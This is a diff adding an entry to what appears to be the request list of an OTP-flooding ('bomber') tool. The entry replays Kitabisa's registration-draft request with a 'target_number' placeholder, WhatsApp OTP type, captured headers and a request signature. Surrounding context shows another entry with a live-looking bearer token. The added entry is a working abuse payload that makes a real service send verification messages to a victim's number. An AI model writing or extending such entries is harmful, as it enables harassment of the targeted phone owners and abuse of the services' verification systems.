@@ -56,5 +56,37 @@
             "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
             "x-auth": "Bearer 63cb746000e1f88adaede0b65928daecac1914832d5fb20538209a76ae1754ea"
         }
+    },
+    {
+    "name": "Kitabisa",
+    "method": "post",
+    "url": "https://geni.kitabisa.com/wong/register/draft",
+    "data": "{\"full_name\":\"Lianto\",\"username\":\"target_number\",\"otp_type\":\"whatsapp\"}",
+    "headers": {
+        "Host": "geni.kitabisa.com",
+        "accept": "application/json",
+        "accept-encoding": "gzip, deflate, br, zstd",
+        "accept-language": "en-US,en;q=0.9",
+        "content-length": "71",
+        "content-type": "application/x-www-form-urlencoded",
+        "origin": "https://accounts.kitabisa.com",
+        "priority": "u=1, i",
+        "referer": "https://accounts.kitabisa.com/",
+        "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+        "sec-ch-ua-mobile": "?1",
+        "sec-ch-ua-platform": "\"Android\"",
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+        "version": "3.4.0",
+        "x-ktbs-api-version": "1.0.0",
+        "x-ktbs-client-name": "kanvas",
+        "x-ktbs-client-version": "1.0.0",
+        "x-ktbs-platform-name": "kanvas",
+        "x-ktbs-request-id": "c0d06b3d-45bf-4524-a5ab-9e8babd4a20c",
+        "x-ktbs-signature": "e2157d6c726d25b9e2c19037f45503b05872430e00ecc0cd76e822ce303322de",
+        "x-ktbs-time": "1745398309"
     }
+}
 ]
